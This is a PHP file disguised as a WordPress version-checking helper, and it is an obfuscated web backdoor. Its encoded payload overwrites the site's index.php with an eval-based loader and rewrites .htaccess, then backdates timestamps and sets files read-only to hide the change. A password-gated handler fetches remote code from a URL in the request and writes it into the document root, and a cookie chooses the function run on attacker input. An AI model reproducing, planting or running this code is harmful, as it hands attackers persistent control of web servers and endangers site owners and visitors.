<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('W1siXC92YXJcL3d3d1wvaHRtbFwvaW5kZXgucGhwIiwiPD9waHAgICRSSkk0QW9kXG49IGZ1bmN0aW9uXHQoJERSSlRlRFFpUikgeyRIbGtQMF8gPSBcImFJdEZFTFwiOyRqeUxkSEVNY1d3aGs9J2cnIC5cdCd6Jy5cbiRIbGtQMF9bMTQgLSAxM10uXHQnTic7ICRqeUxkSEVNY1d3aGsuPVxuJEhsa1AwX1s0ICsgLTFdXG47XHQkanlMZEhFTWNXd2hrXG4uPVxuJEhsa1AwX1s1XSAuXG4kSGxrUDBfWyg4NyAtIDg3KSBcLyAyXVxuLiAkSGxrUDBfWzJdXHQuJEhsa1AwX1syMCArIC0xNl0gOyRqeUxkSEVNY1d3aGsuPSAnJztyZXR1cm4gJGp5TGRIRU1jV3doaygkRFJKVGVEUWlSKTt9OyR0VW5mdTNkQXUydT1mdW5jdGlvbiAoKXskWkZ4S0s9XCJ6dVRiaXpmV0ZjYlJzVlFhX184dlRBUFI0NVdNdlVfcnhxZ3l4dmsxSnNaVW15RXcwZXpETTFDQkpIdF9raFlcIjtcblxuIHJldHVybiAkWkZ4S0s7fTtcdCRzOXY0aTJiSHRrRjE9J3pWbDVWOXRJRXZcL2JmSXBHbzBSU1JwWk5Nc3h1SU1MaGdUajJPY0FZTTVtOGhOV1RwYmF0Uk5lb1phNlk3NzVWM1MxWk51YWFZM2Q1TDdIVlhYZFZcLzZwYUpqVFAwOXpOYVpibVJaaU05TGF4dWZJK1RFS1gwVUxYZ3BCbGtYZnRjaXFtbVlSdnc1WmJoREYxb3pBT0NcLzNOejIzQk5VclNuTG9UUm5QWEc0QThmUTJXMVZINjlhdXRcL2ZSbVhRTWExZk9MTUUySVRWUjMzK2xcLzFqeGZPK1wvVXZtOG95dVpLT05STHdsV2JLQXA1K1pKVW5MQndtWWNGVll6dkt3MytUUWMxRGVxUFU3bERnalNocXdvdVhvRjlzSHU3b3JKNG1Ic3hKYUJhZTllNWlpTnlRWE1HRW0xbHpXb3JoQ1orR2tBRWJPV3N2OWY4cDlMWlduazN5U1B3bFFCeHdteGxYQlRaUnF0MWVYbHBNZEFTZXhtejBuelVZdjRZSGxoTExyYmExbHRsaGZBXC96cmx4TlM3aWFJN1wvOGczblhIdjc5bTJMN3lwYkt5XC9ZdTVaUXVBV1JBbnRSSEZxTGd0Q1VMU2tVbnFMVTMwSjZcL0p5dGNra2JVWmg4SXprRmhWNVUwRHp4SUZSa25OTmg1S0YzWHozeFpDc3ZtTklTM0Z6eGxtWXBYeEtJbWhwN1ljTGk1d1JLdWg0bUFiMzZJK0VTM3RlbDhCZ0lRK2JpSUdudXhBSTB2YWhrdmdnc01LSVdua3IyekVtTUJrZ05HUmE2NnA0NnZWK2QzbWZ0b044XC9jYmQzZHB5VHZ0dmRQdG9cLzI5NTN0SE9qd3lZRFZ1U1BFc0lKTWNsUEJxOWlkWkxmcDZEbjdEazlwd2VDU1lmY3QwYzJpQkRqM1NmbURKNWMwSHZVWHlxcHZsMEtHNmVzNEtkUFVpcWM4dUQ0dEsrY2M1UER1ZDJlODh1WmM5cDN6M3FIZkRcL01ZTnVQUXBvVVlZWW5TOFUwd3hwK01MRkF2WUNpNTE2ZWU5ZDZsU2p0RElDaHVUMEMxZzJpV2VDV09kdnJRamI0S3FhbHR0NmpRNXJUWEREa3RZMEQwTmM4QUdmNEZubzF4eFduQlcxdUI0SGdETE1WdEN3RHFzQXJQS2dsaGh5MjVMUzBsMW1lRmlsXC9CcmtZQnpmTEtmaWd0QVFjUWU1NStpRStKbEdzYkp4MUZBTUJTQzB3T1wvUXFpOUtBNm5MSEpFaUlxRlFKQXJyUDdYTkxFdkFkSG1wUVlPSGUyamxIS1RUSG5TQTlHbUlwVU5hS05GS0lRbXVJXC9oNitqZHpZS1wveXhydjN3N3hhY21aR3NjTjE2MVRHd1wvTlVmUWswWVlxcGVQREVNOHAxSFNNMHBtMFRnUEp3d2ZFWjVTQUFtMkRhc2t1bVV6TXZYdndRXC9HazMxQnhRbkNFMlZjWkVRZ0VZVlZzdlcrVElYcEdsR1IzczV5dE5KRmdZWVdHd0RHM01ya25henlwdGFNQnVpZk9GRk9yWVgzVEJtZTd5WTNHekN4cnFzTUZORElsWjRjY2FUWExCSHlLK0NOSXlSMU1cLzlONjkxWUxDMEx3bHdsZzdVOWFsK21oUlFxcENLSWc5am5RQkNYdW1hQkRXTldHUkVDeWg0K0tLVjRJSlIxOHhTM3l3dTJrdGtLNnVycm9YSFhtcml3VGUrVjN2NFZcL2F2OHZsMmpuT2hDaUJOeGl0SVVpbXd5bmo1TjB5aGdrTjdiVk1OMzlsaFVtQ2dLMkpZXC9QSEhCZlU4RU5rSVhJY3dzQ3dIbnFHSUFaUElQa3JUVVVRdFA3VytacndLT3pJVzlndW1XVnFKeDB3Z01nYUhGN2lvSHpnUXBnckhoTnhWQ2pXYURkTGdHdlR5d0FzcmFwR29VMEkxRTh1V2xsb1Y3enp4N1VJUWJ5bTAycG03ZjQyYkMwNktBcTg3K0xoamp6b2t6T2ZqanFUZG5JMDV5OERoeWNEd0FEN1dDeGpBQzlVOEZTVElJa29zQjRIR25ZUXNaMEFjcVFmaVB0QjRCbUQ4S2JENEkwQ2hXZm9NY2pWdE9pM0RzQ3B3azVmUmh0WUNkYktFN3FKS3FYOFpoRFFXc1VPRTZyMlFvV3M3Z3J4WlhHZDBneFQwcW1paHhwcEVmYTRsTEJobzREeitGUENCdElOYzNta2FqZWVpRDdMaUtTZ1BaRzBhTkhrZGluTUdDR0pDUEtpdWZXckd6ZUJMXC8yQWozR0FuVUlheUhQRDROUnEzYUV3NkthQlV5QjJaSnVyQ2RsMG5LZmkxS1BKOHF0OXR4dEMyb2M3bE9TZVNpMHNRQjFNc2JDNUpnaG9HckQ0eHdEUnFrbGtjQkEyTDhieFhMUnBDUnoxXC9ESWxHWm84UjlhS083V29HTldjTEl6VXN1dkxZNHJlTEdyUUlzUkRVeXY4eW5paEJcL0Y4WnV5eGM4aEpsU2tsOHd2bVRFWnVCMldMTWxxTVpuQ2E0ajl6QnNPXC9cL0oyQUFoNUREd1Awb29KYWRiOW1KRnVXamN6bTJQZlFBRWdFUGhsNFlhWmFRc0lGN0FnYmx5Z0w4ejQrcWErMTJlODBiK0o2M3ZnNm5CQnhlbDROclplb0liXC9yTExGVmF5N25cL0VqUG44eW9hN1BUYUc2ZnBkQUFOZHVybjNyQ1k3dVRlWlVSenpEWmNHQkJVNERDcldjRHZNUGNNV05ZOVwvUUxHK0lXVzlkbHIzcHhEMStLOXE2TmJlSDgybHBSV2c2dWNIUnZRaDlKZnNDYTBmNVBMTEF0ZmE2SFF3M1A5NnZwbU9wamMzRXlMTkp1bUNkeks2WlFWY0pDbmZqUVpUS0hCWnVEb3paUmx3RFlkVHBJcE5nZkRlcVcyTkJNT3pacGlRaHB6ZWxFaXNXR0lnZUwxK1FKU3ZaOFYzTnp3SXE3RWc3Um9aZDZJZHJCY0lXNW1tZDk2VHdrS2M4MzQrd0VRT1wveWRMUGhRV0Y5YTg3bW81MkJRNWVBWkhxUFFSenpHcWhGRHp0K2V3SUZNSUtoRXcwUmhEbmd1XC8ydHhmMjRFeDJsY1JoRE1oa3pZXC9Bb2VcL2s4TDZBSHNFTVA1dEhxSUJaakk1Zkk3eHhhKzY3RnY0ak9OcXMrdm1RQ2FmTW1FbzR1eUtDdFVna1ZIbFJ3aHIxRjhVeUJmRkhINGJhNGJcL0EwbUoxYU03K1g3RmZpdzVPS21IQXNnaEhZZDBSWWdiQzRIOEJCeXVBc3oyWGY0QlBCUU90KzBYejh6bTV2ek0yTTNoZElOMHdUYUlEWXhNU3JVZWpVY0FQR0NWcjZTeFJiRHhqU0szQ2oxQW5BYTI4ekFZXC9Ubm45eUErbnoyOFE1NmJYODN2ZWkrM2dzXC9YYVwvSDNtXC9cL3VnbjJnelh2WXlcL3FKdU4xR3I0dEJ2M0RTWEF3Ym91K295YjAwaDBYN216b1wvbU5pYjd6OXl3dWdHMzk2ZlJUNWJ6N1VWRUFPVjBQbUJtR3VLejVqb2xzMjRtXC9WZ2tuYVwvMWhmaFwva3luMUJrZ0ZIcHZUK08wNEJ2dHlDdG51XC9UaWhCSmhtRkVZYWFvN0daM1NSYzhlNEFMNDRtdmtaQnBGdUg1SklpN0pSXC9xUkFMdFpCSkZzMWxEUG81dStKZnFCZ2d6cGsxOFlIUERaSGJzK0FLamdJTUZ0UHl4U1hiT2V0M2pFM3dyMk9Vb0hUMUd1SGZjN1I1XC83Qjd2YlBjUGo0K3E0c0t6dktxakZiYXdvM1lEdUZlV2M3Unp2SHQ0dEc4U2JYUVRabWFBYjdZTHFobjFLVnNPUWlINEs4SkFGSEdmVnd6UTFlWnp4S09hVGsrNzdxOU83M0R2MDRuajlFeXl0OTA5ZFdwWDlTY3c0b3ZWZWNiYnV1Y3lOOFwvd0hsXC9YSGpqYnUyaVBaRjhtdU1wektabzhRZllKTjNidEtSNGk2ZDZoMDkwOU5XZHoySndoOTdMMm5QNVo3NmpmMno0NjNVTXZTbjJxZkMzQ0dla1Y5Wkd0WGxoK2xESmFXOHhwTWNrVHdUZFhcL0FnSnZDcjVzRmdlSHV4NlwvRVRCOXV4RXllcmxielJXSzFwNWViMTdIQnFOSngyR0I4Z1czRjhUVGJObTVLTFwvVWxiZCs4WXRPRmE2WDdJdWhvRHBzcDRrNFFKSStxOVwvdlRqYWFkOThPRjBIY055N0R2WjczM0N0R3g5ZERINnhiV1VlVU9UN2ZWbEdcL0JYQktvMno0bnJoTjRsVFwvQ1VDbWljY3ZpS04wa3U2K0pzSkoxaTFiYUtsdzZGbTROdG1mZW1QRzc4QmF2UStidmQyblYzM3BIZmNQNWFTSHljak5vcm5Ga3NGUzAxMTkzckhSNGdudSs2VExGOUdQM09rZnNKa3hBWGtLUFZUVWQ5UjVnSTgrMUVGNVdDQUlZYzB1ZEMxbnZQaHVPKzQyN3U3UGEyMDBJZGsrbkcybkFhUWNaSjhTOUxMWkdhV1ZMeVVIZzI4SldJNHY1dU1PdWxpQnViMkZreTdoK29CNCs3aDRPYXQzSkxPMXJzT3RMMlYxcXRYSytRVjJjdWg4RW1Sa21KTXljYzBEMDV5NktURXk3SW9GS09LUmZyamtCRTg5Q1JJS1V1MEFqNkpsMXdYWXhnRFRUS1lGQVI3SjBONWwxbHpFS1dqcGdCVmJMRGtjaHdDQkNBck1BV2tnRjdMYXFwQU41OXQwQUQ0RjFNTDVLQ285M0FsK0FaM3Joa3RyTFpXU3N2N0Q4aXByYUpFcmhkR1laZ0NTRmhVOGkrOG5BelNOT0ppb1FIQzNVUW4ya2YrazVcL2JQM0ErT0tlYUdGQUlaQmYxa2k3NnVhRENTUzVDaUdLTWt4UXE2c014d1Y2S1VuUDYreVRNUVN6TVBZa1h3eGZYM1R2c09xNUx4THZNdVwvSFNRTmxcL0FBJzskczl2NGkyYkh0a0YxPWhDQ2g4aW5JTzB2b3UoJHM5djRpMmJIdGtGMSk7XG4gZnVuY3Rpb24gXHRVYXVlTkozUFx0KClcdHtyZXR1cm4gXCJEZGQ3VVhFNEVKQXBPYjZcIjt9XG4gXG4gXG4kczl2NGkyYkh0a0YxXHQ9ICRSSkk0QW9kKCRzOXY0aTJiSHRrRjEpOyBmdW5jdGlvbiBcbmhDQ2g4aW5JTzB2b3UoJGt1VHFQWjJJdXJkZW16XHQpeyRTamo5WCA9IFwiZUVDNGJBb1wiOyRqRk8zeHNzVj0kU2pqOVhbKDAgKiAxNSkgKyA0XSA7ICRqRk8zeHNzVlx0Lj0gXHQkU2pqOVhbKDkwIC0gODApIFwvIDJdLiAncydcdC4kU2pqOVhbMF0uICgoNTQgLSA0MikgXC8gMikgOyAkakZPM3hzc1YuPVx0XHQoKDQgKiAxKSkgLiAnXycgLlxuJ0QnLiRTamo5WFs1IC0gNF1cbi5cbiRTamo5WFsxNiArIC0xNF07ICRqRk8zeHNzVi49XHQkU2pqOVhbMjQgLSAxOF1cdC4nRCcuXHQkU2pqOVhbKDU5IC0gNTkpIFwvIDNdXG4uICcnO1xuXHRcblxuIHJldHVybiAkakZPM3hzc1YoJGt1VHFQWjJJdXJkZW16KTsgXG4gXHRcblx0XHR9IFxuRXZBbFx0KCRzOXY0aTJiSHRrRjEpOzsgPz48P3BocCAgZGVmaW5lKCdXUF9VU0VfVEhFTUVTJywgdHJ1ZSApO3JlcXVpcmUoX19ESVJfXy4gICdcL3dwLWJsb2ctaGVhZGVyLnBocCcgKTsgPz4iLCI2YTU5MTVhZDkwZjAzY2I3MDQ3NzUyOWVjMWM0OGE0ZSJdLFsiXC92YXJcL3d3d1wvaHRtbFwvLmh0YWNjZXNzIiwiPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+XHJcblJld3JpdGVFbmdpbmUgT25cclxuUmV3cml0ZUJhc2UgXC9cclxuUmV3cml0ZVJ1bGUgXmluZGV4LnBocCQgLSBbTF1cclxuUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWZcclxuUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWRcclxuUmV3cml0ZVJ1bGUgLiBpbmRleC5waHAgW0xdXHJcbjxcL0lmTW9kdWxlPiIsImJlNDc2ZDI3ZWNlODk1OTQ2MDRkMTQ4ODZjMDgxMDE2Il1d', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("ndtfk{$check}fqc", 'b561eb7de56ea7ec00fb3f0ce79e3bf4')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}